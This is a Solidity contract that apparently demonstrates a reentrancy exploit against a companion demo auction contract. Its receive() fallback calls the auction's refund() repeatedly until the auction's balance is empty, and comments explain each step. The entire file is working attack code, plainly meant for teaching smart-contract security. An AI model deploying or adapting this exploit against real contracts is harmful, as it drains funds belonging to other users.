//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "./ReentrancyAuction.sol";

contract ReentrancyAttack {
  address payable owner;
  ReentrancyAuction auction;

  constructor(ReentrancyAuction _auction) {
    auction = _auction;
  }

  // bids from the smart contract directly instead of bidder's wallet
  function proxyBid() external payable {
    auction.bid{ value: msg.value }();
  }

  function attack() external {
    // `refund` function is called on behalf of the current contract
    auction.refund();
  }

// being called by the auction's `refund` function
  receive() external payable {
    // refund is being called recurrently until auction balance is empty
    if (auction.currentBalance() > 0) {
      auction.refund();
    }
  }

  function currentBalance() external view returns(uint) {
    return address(this).balance;
  }
}